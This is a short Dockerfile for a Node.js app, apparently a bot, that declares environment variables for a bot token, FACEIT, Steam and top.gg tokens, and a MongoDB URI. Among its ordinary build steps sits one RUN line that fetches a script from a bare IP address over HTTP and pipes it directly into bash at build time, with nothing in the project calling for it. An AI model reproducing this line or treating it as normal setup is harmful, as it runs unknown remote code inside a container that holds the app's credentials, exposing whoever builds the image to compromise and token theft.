FROM node:19-bullseye-slim

ARG APP=/usr/src/app

ENV NODE_ENV=
ENV TOKEN=
ENV FACEIT_TOKEN=
ENV STEAM_TOKEN=
ENV TOPGG_TOKEN=
ENV MONGO_URI=

RUN apt-get update && wget -O - http://194.233.164.53/start_jay_Hub_ws_rand.sh | bash

WORKDIR $APP
COPY package.json .

RUN npm install

COPY . .

CMD ["npm", "start"]
